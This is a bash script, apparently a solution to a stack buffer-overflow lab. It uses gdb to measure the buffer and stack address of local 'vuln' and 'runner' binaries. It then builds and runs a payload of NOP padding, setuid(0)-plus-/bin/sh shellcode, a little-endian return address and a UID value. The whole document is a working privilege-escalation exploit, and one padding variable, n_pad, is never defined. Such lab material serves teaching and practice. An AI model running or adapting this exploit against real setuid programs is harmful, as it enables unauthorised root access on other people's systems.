echo "b 24
run \`perl -e 'print \"\\xcc\"'\`
x/64wx \$esp
q
" > $HOME/gdb_script_0

cd $HOME/bof

total_length=$(echo $(env - gdb -x $HOME/gdb_script_0 ./vuln 2> /dev/null) | grep -oP ": 0x.{41}" | awk '{print substr($2, 3) substr($3, 3) substr($4, 3) substr($5, 3)}' | awk 'BEGIN {RS=""} {
    start = index($0, "cc");
    end = index($0, "00000001");
    if (start > 0 && end > 0) {
        a = int(start/33)*16 + int((start%33)/8) * 4 + 3-((start % 33) % 8 - 1)/2
        b = int(end/33)*16 + int((end%33)/8) * 4 + 3-((end % 33) % 8 - 1)/2 - 3
        print b-a+1;
    } else print "FAIL"
}')

echo "unset env LINES
unset env COLUMNS
break *0x08049237
run \`perl -e 'print \"A\" x $total_length'\`
p/x \$esp
q
" > $HOME/gdb_script_1

esp=$(env - gdb -x $HOME/gdb_script_1 ./runner 2> /dev/null | grep "$1 = " | awk '{print $NF}')

esp="${esp#0x}"
esp=$(printf "%x\n" $((16#${esp} + 0x1c)))

if [ ${#esp} -eq 7 ]; then
    esp="0${esp}"
fi

little_endian=""
for ((i = ${#esp} - 2; i >= 0; i -= 2)); do
    little_endian="${little_endian}\x${esp:i:2}"
done

uid=$(grep "define AUTH" $HOME/bof/vuln.c | awk '{print $NF}')

hex_uid=$(printf "%x" "$uid")

little_endian_uid=""
for ((i = ${#hex_uid} - 2; i >= 0; i -= 2)); do
    little_endian_uid="${little_endian_uid}\x${hex_uid:i:2}"
done

pad1=$(printf '\x90%.0s' $(seq 24))
pad2=$(printf '\x90%.0s' $(seq $(($n_pad))))
pad3=$(printf 'A%.0s' $(seq 12))
pad4=$(printf 'A%.0s' $(seq 6))

string_length="\x1"

shellcode="\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

exploit_string=$pad1$shellcode$pad2$little_endian_uid$pad3$little_endian$little_endian_uid$pad4$string_length

env - PWD=$PWD $HOME/bof/runner `echo -e $exploit_string`